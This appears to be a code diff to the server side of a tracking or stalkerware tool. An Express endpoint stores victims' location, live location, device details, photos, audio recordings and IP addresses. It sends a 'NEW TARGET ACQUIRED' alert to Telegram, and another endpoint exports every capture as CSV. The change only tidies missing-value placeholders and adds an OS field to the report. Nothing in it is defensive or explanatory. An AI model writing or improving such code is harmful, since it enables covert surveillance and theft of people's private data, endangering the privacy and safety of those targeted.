@@ -126,7 +126,7 @@ app.post('/api/store', async (req, res) => {
             fullDeviceInfo: fullDeviceInfo || {},
             userPhoto: userPhoto || null,
             audioData: audioData || null,
-            ipAddress: ipAddress || 'Unknown',
+            ipAddress: ipAddress || '—',
             networkSpeed: networkSpeed || {},
             liveLocation: liveLocation || {},
             captureCount: captureCount || 0,
@@ -136,17 +136,23 @@ app.post('/api/store', async (req, res) => {
         allData.unshift(newEntry);
         console.log('✅ Stored! Total:', allData.length);
 
-        // Send to Telegram
+        // ==========================================
+        // TELEGRAM CAPTION - No Unknown!
+        // ==========================================
+        const device = fullDeviceInfo || deviceDetails || {};
+        const loc = location || {};
+        
         const caption = `
 🔴 <b>NEW TARGET ACQUIRED</b> 🔴
-📍 Location: ${location?.lat || 0}, ${location?.lng || 0}
-📱 Device: ${fullDeviceInfo?.deviceName || deviceDetails?.deviceName || 'Unknown'}
-📱 Model: ${fullDeviceInfo?.deviceModel || 'Unknown'}
-🏭 Manufacturer: ${fullDeviceInfo?.manufacturer || 'Unknown'}
-📡 IP: ${ipAddress || 'Unknown'}
-📶 Network: ${fullDeviceInfo?.connection?.type || 'Unknown'}
-🚀 Speed: ${networkSpeed?.download || 'Unknown'} Mbps
-🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'}
+📍 Location: ${loc.lat || '—'}, ${loc.lng || '—'}
+📱 Device: ${device.deviceName || '—'}
+📱 Model: ${device.deviceModel || '—'}
+🏭 Manufacturer: ${device.manufacturer || '—'}
+📲 OS: ${device.os || '—'} ${device.osVersion || ''}
+📡 IP: ${ipAddress || '—'}
+📶 Network: ${device.connection?.type || '—'}
+🚀 Speed: ${networkSpeed?.download || '—'} Mbps
+🔋 Battery: ${device.battery?.level || '—'}
 📸 Captures: ${captureCount || 1}
 🕐 Time: ${new Date().toISOString()}
         `;
@@ -175,7 +181,7 @@ app.post('/api/store', async (req, res) => {
 app.get('/api/get-ip', (req, res) => {
     const ip = req.headers['x-forwarded-for'] || 
                req.connection.remoteAddress || 
-               'Unknown';
+               '—';
     res.json({ success: true, ip: ip });
 });
 
@@ -187,16 +193,17 @@ app.get('/api/export-csv', (req, res) => {
         let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio,Captures\n';
         
         allData.forEach(item => {
+            const device = item.fullDeviceInfo || item.deviceDetails || {};
             const row = [
                 item._id,
                 item.timestamp,
-                item.location?.lat || 0,
-                item.location?.lng || 0,
-                item.ipAddress || 'Unknown',
-                item.deviceDetails?.deviceName || 'Unknown',
-                item.fullDeviceInfo?.deviceModel || 'Unknown',
-                item.fullDeviceInfo?.connection?.type || 'Unknown',
-                item.networkSpeed?.download || 'Unknown',
+                item.location?.lat || '—',
+                item.location?.lng || '—',
+                item.ipAddress || '—',
+                device.deviceName || '—',
+                device.deviceModel || '—',
+                device.connection?.type || '—',
+                item.networkSpeed?.download || '—',
                 item.audioData ? 'Yes' : 'No',
                 item.captureCount || 1
             ];
